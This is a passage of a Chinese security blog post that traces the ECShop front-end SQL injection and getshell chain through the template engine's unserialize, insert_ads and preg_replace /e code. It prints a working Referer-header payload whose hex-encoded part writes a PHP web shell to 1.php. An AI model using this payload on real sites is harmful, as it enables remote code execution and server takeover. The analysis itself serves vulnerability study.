class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>从<code>user.php</code>调用<code>display</code>函数，传递进来的<code>$filename</code>是<code>user_passport.dwt</code>，从函数来看，首先会调用<code>$this-&gt;fetch</code>来处理<code>user_passport.dwt</code>模板文件，<code>fetch</code>函数中会调用<code>$this-&gt;make_compiled</code>来编译模板。<code>user_passport.dwt</code>其中一段如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>&amp;nbsp;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"left"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"act"</span> <span class="attr">value</span>=<span class="string">"act_login"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"back_act"</span> <span class="attr">value</span>=<span class="string">"&#123;$back_act&#125;"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">""</span> <span class="attr">class</span>=<span class="string">"us_Submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>make_compiled</code>会将模板中的变量解析，也就是在这个时候将上面<code>assign</code>中注册到的变量<code>$back_act</code>传递进去了，解析完变量之后返回到<code>display</code>函数中。此时<code>$out</code>是解析变量后的html内容，判断<code>$this-&gt;_echash</code>是否在<code>$out</code>中，若在，使用<code>$this-&gt;_echash</code>来分割内容，得到<code>$k</code>然后交给<code>insert_mod</code>处理</p>
+<p>由于<code>_echash</code>是默认的，不是随机生成的，所以<code>$val</code>内容可随意控制。跟进<code>$this-&gt;insert_mod</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function insert_mod($name) // 处理动态内容</span><br><span class="line">&#123;</span><br><span class="line">    list($fun, $para) = explode(&apos;|&apos;, $name);</span><br><span class="line">    $para = unserialize($para);</span><br><span class="line">    $fun = &apos;insert_&apos; . $fun;</span><br><span class="line"></span><br><span class="line">    return $fun($para);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>$val传递进来，</p>
+<p>先用<code>|</code>分割，得到<code>$fun</code>和<code>$para</code>，<code>$para</code>进行反序列操作，<code>$fun</code>和<code>insert_</code>拼接，最后动态调用<code>$fun($para)</code>，函数名部分可控，参数完全可控。接下来就是寻找以<code>insert_</code>开头的可利用的函数了，在<code>ecshop/includes/lib_insert.php</code>有一个<code>insert_ads</code>函数，正好满足要求。看下insert_ads</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">function insert_ads($arr)</span><br><span class="line">&#123;</span><br><span class="line">    static $static_res = NULL;</span><br><span class="line"></span><br><span class="line">    $time = gmtime();</span><br><span class="line">    if (!empty($arr[&apos;num&apos;]) &amp;&amp; $arr[&apos;num&apos;] != 1)</span><br><span class="line">    &#123;</span><br><span class="line">        $sql  = &apos;SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, &apos; .</span><br><span class="line">                    &apos;p.ad_height, p.position_style, RAND() AS rnd &apos; .</span><br><span class="line">                &apos;FROM &apos; . $GLOBALS[&apos;ecs&apos;]-&gt;table(&apos;ad&apos;) . &apos; AS a &apos;.</span><br><span class="line">                &apos;LEFT JOIN &apos; . $GLOBALS[&apos;ecs&apos;]-&gt;table(&apos;ad_position&apos;) . &apos; AS p ON a.position_id = p.position_id &apos; .</span><br><span class="line">                &quot;WHERE enabled = 1 AND start_time &lt;= &apos;&quot; . $time . &quot;&apos; AND end_time &gt;= &apos;&quot; . $time . &quot;&apos; &quot;.</span><br><span class="line">                    &quot;AND a.position_id = &apos;&quot; . $arr[&apos;id&apos;] . &quot;&apos; &quot; .</span><br><span class="line">                &apos;ORDER BY rnd LIMIT &apos; . $arr[&apos;num&apos;];</span><br><span class="line">        $res = $GLOBALS[&apos;db&apos;]-&gt;GetAll($sql);</span><br><span class="line">    &#125;</span><br><span class="line">   /*****</span><br><span class="line">   *****</span><br><span class="line">   ****/</span><br><span class="line">   </span><br><span class="line">    $need_cache = $GLOBALS[&apos;smarty&apos;]-&gt;caching;</span><br><span class="line">    $GLOBALS[&apos;smarty&apos;]-&gt;caching = false;</span><br><span class="line"></span><br><span class="line">    $GLOBALS[&apos;smarty&apos;]-&gt;assign(&apos;ads&apos;, $ads);</span><br><span class="line">    $val = $GLOBALS[&apos;smarty&apos;]-&gt;fetch($position_style);</span><br><span class="line"></span><br><span class="line">    $GLOBALS[&apos;smarty&apos;]-&gt;caching = $need_cache;</span><br><span class="line"></span><br><span class="line">    return $val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>SQL查询结束之后会调用模板类的<code>fetch</code>方法，在<code>user.php</code>中调用<code>display</code>，然后调用<code>fetch</code>的时候传入的参数是<code>user_passport.dwt</code>，而在此处传入的参数是<code>$position_style</code>，向上溯源，发现是<code>$row[&#39;position_style&#39;]</code>赋值而来，也就是SQL语句查询的结果，结果上面这个SQL注入漏洞，SQL查询的结果可控，也就是<code>$position_style</code>可控。</p>
+<p>要到<code>$position_style = $row[&#39;position_style&#39;];</code>还有一个条件，就是<code>$row[&#39;position_id&#39;]</code>要等于<code>$arr[&#39;id&#39;]</code>，查询结果可控，<code>arr[&#39;id&#39;]</code>同样可控。</p>
+<p>之后<code>$position_style</code>会拼接<code>&#39;str:&#39;</code>传入<code>fetch</code>函数，跟进<code>fetch</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function fetch($filename, $cache_id = &apos;&apos;)</span><br><span class="line">    &#123;        </span><br><span class="line">    if (!$this-&gt;_seterror)</span><br><span class="line">        &#123;</span><br><span class="line">            error_reporting(E_ALL ^ E_NOTICE);</span><br><span class="line">        &#125;</span><br><span class="line">        $this-&gt;_seterror++;</span><br><span class="line"></span><br><span class="line">        if (strncmp($filename,&apos;str:&apos;, 4) == 0)</span><br><span class="line">        &#123;</span><br><span class="line">            $out = $this-&gt;_eval($this-&gt;fetch_str(substr($filename, 4)));</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<p>因为之前拼接<code>&#39;str:&#39;</code>了，所以<code>strncmp($filename,&#39;str:&#39;, 4) == 0</code>为真，然后会调用危险函数<code>$this-&gt;_eval</code>，这就是最终触发漏洞的点。但是参数在传递之前要经过<code>fetch_str</code>方法的处理，跟进</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">function fetch_str($source)</span><br><span class="line">&#123;</span><br><span class="line">    if (!defined(&apos;ECS_ADMIN&apos;))</span><br><span class="line">    &#123;</span><br><span class="line">        $source = $this-&gt;smarty_prefilter_preCompile($source);</span><br><span class="line">    &#125;</span><br><span class="line">    $source=preg_replace(&quot;/([^a-zA-Z0-9_]&#123;1,1&#125;)+(copy|fputs|fopen|file_put_contents|fwrite|eval|phpinfo)+( |\()/is&quot;, &quot;&quot;, $source);</span><br><span class="line">    if(preg_match_all(&apos;~(&lt;\?(?:\w+|=)?|\?&gt;|language\s*=\s*[\&quot;\&apos;]?php[\&quot;\&apos;]?)~is&apos;, $source, $sp_match))</span><br><span class="line">    &#123;</span><br><span class="line">        $sp_match[1] = array_unique($sp_match[1]);</span><br><span class="line">        for ($curr_sp = 0, $for_max2 = count($sp_match[1]); $curr_sp &lt; $for_max2; $curr_sp++)</span><br><span class="line">        &#123;</span><br><span class="line">            $source = str_replace($sp_match[1][$curr_sp],&apos;%%%SMARTYSP&apos;.$curr_sp.&apos;%%%&apos;,$source);</span><br><span class="line">        &#125;</span><br><span class="line">         for ($curr_sp = 0, $for_max2 = count($sp_match[1]); $curr_sp &lt; $for_max2; $curr_sp++)</span><br><span class="line">        &#123;</span><br><span class="line">             $source= str_replace(&apos;%%%SMARTYSP&apos;.$curr_sp.&apos;%%%&apos;, &apos;&lt;?php echo \&apos;&apos;.str_replace(&quot;&apos;&quot;, &quot;\&apos;&quot;, $sp_match[1][$curr_sp]).&apos;\&apos;; ?&gt;&apos;.&quot;\n&quot;, $source);</span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     return preg_replace(&quot;/&#123;([^\&#125;\&#123;\n]*)&#125;/e&quot;, &quot;\$this-&gt;select(&apos;\\1&apos;);&quot;, $source);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>再来看 <strong>命令执行的payload</strong> ：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:&quot;num&quot;;s:280:&quot;*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10-- -&quot;;s:2:&quot;id&quot;;s:3:&quot;&apos;/*&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当中的16进制对应字符串如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;$asd&apos;];assert(base64_decode(&apos;ZmlsZV9wdXRfY29udGVudHMoJzEucGhwJywnPD9waHAgZXZhbCgkX1BPU1RbMTMzN10pOyA/Picp&apos;));//&#125;xxx</span><br></pre></td></tr></table></figure>
+
+<p>这个命令执行的关键点，还是利用了之前的注入点，同样引入了 <strong>/\</strong>/** 将 <strong>ORDER BY</strong> 语句给注释掉。当中，payload会经过 <strong>includes/cls_template.php</strong> 文件的这条语句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return preg_replace(&quot;/&#123;([^\&#125;\&#123;\n]*)&#125;/e&quot;, &quot;\$this-&gt;select(&apos;\\1&apos;);&quot;, $source);</span><br></pre></td></tr></table></figure>
+
+<p>这里的 <strong>preg_replace</strong> 使用了危险的 <strong>/e</strong> 模式，而第二个参数中的 <strong>\1</strong> 实际表示的是下图绿色部分字符串：</p>
+<p><img src="https://s1.ax1x.com/2020/04/16/JF26JA.png" alt="JF26JA.png"></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接:"></a>参考链接:</h2><p><a href="https://www.cdxy.me/?p=756" target="_blank" rel="noopener">https://www.cdxy.me/?p=756</a></p>
+<p><a href="https://blog.csdn.net/chasingin/article/details/104346921" target="_blank" rel="noopener">https://blog.csdn.net/chasingin/article/details/104346921</a></p>
+<p><a href="https://www.leavesongs.com/PENETRATION/thinking-about-config-file-arbitrary-write.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/thinking-about-config-file-arbitrary-write.html</a></p>
+<p><a href="https://mochazz.github.io/2018/08/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1Day8%20-%20preg_replace%E5%87%BD%E6%95%B0%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#%E5%89%8D%E8%A8%80" target="_blank" rel="noopener">https://mochazz.github.io/2018/08/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1Day8%20-%20preg_replace%E5%87%BD%E6%95%B0%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#%E5%89%8D%E8%A8%80</a></p>
+<p><a href="https://xz.aliyun.com/t/2557" target="_blank" rel="noopener">https://xz.aliyun.com/t/2557</a></p>
+<p><a href="https://mochazz.github.io/2018/09/10/%E5%85%B3%E4%BA%8EECShop%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5%E5%92%8Cgetshell%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/#ECShop2-x" target="_blank" rel="noopener">https://mochazz.github.io/2018/09/10/%E5%85%B3%E4%BA%8EECShop%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5%E5%92%8Cgetshell%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/#ECShop2-x</a></p>
+<p><a href="https://nikoeurus.github.io/2018/10/16/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E9%80%9A%E8%BF%87preg_replace%E5%87%BD%E6%95%B0%E6%B7%B1%E5%85%A5%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" target="_blank" rel="noopener">https://nikoeurus.github.io/2018/10/16/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E9%80%9A%E8%BF%87preg_replace%E5%87%BD%E6%95%B0%E6%B7%B1%E5%85%A5%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</a></p>
+
+    </div>
+
+    
+    
+    
+        
+      
+
+      <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2020/04/14/插眼-分析ysoserial-payload-CommonsCollections2/" rel="next" title="(插眼)分析ysoserial payload --CommonsCollections2">
+                  <i class="fa fa-chevron-left"></i> (插眼)分析ysoserial payload --CommonsCollections2
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+        
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#经典写入配置漏洞"><span class="nav-number">1.</span> <span class="nav-text">经典写入配置漏洞:</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#解法1-利用反斜线"><span class="nav-number">1.1.</span> <span class="nav-text">解法1 利用反斜线</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解法2-利用正则"><span class="nav-number">1.2.</span> <span class="nav-text">解法2 利用正则</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解法3-利用-00"><span class="nav-number">1.3.</span> <span class="nav-text">解法3 利用%00</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#相关—discuz-后台getshell"><span class="nav-number">1.4.</span> <span class="nav-text">相关—discuz 后台getshell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#preg-replace函数之命令执行"><span class="nav-number">2.</span> <span class="nav-text">preg_replace函数之命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#关于反向引用，给个例子"><span class="nav-number">2.0.1.</span> <span class="nav-text">关于反向引用，给个例子</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#回归题目"><span class="nav-number">2.0.2.</span> <span class="nav-text">回归题目:</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#分析"><span class="nav-number">2.0.3.</span> <span class="nav-text">分析:</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ECShop前台注入和getshell漏洞"><span class="nav-number">3.</span> <span class="nav-text">ECShop前台注入和getshell漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考链接"><span class="nav-number">4.</span> <span class="nav-text">参考链接:</span></a></li></ol></div>
+        
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">su33er</p>
+  <div class="site-description" itemprop="description">心之所向皆是遗憾，目之所及皆是过往</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">11</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">categories</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">tags</span>
+        </a>
+      </div>
+    
+  </nav>
+</div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://mi1itray_axe.gitee.io/" title="https://mi1itray_axe.gitee.io/" rel="noopener" target="_blank">Team233核心人物-张大炮</a>
+        </li>
+      
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+        
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">su33er</span>
+</div>
+  <!--<div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0
+  </div>
+-->
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">
+      
+    Theme – <a href="https://muse.theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.4.1
+  </div>
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+  
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.4.1"></script><script src="/js/motion.js?v=7.4.1"></script>
+<script src="/js/schemes/muse.js?v=7.4.1"></script>
+<script src="/js/next-boot.js?v=7.4.1"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  
+
+</body>
+</html>
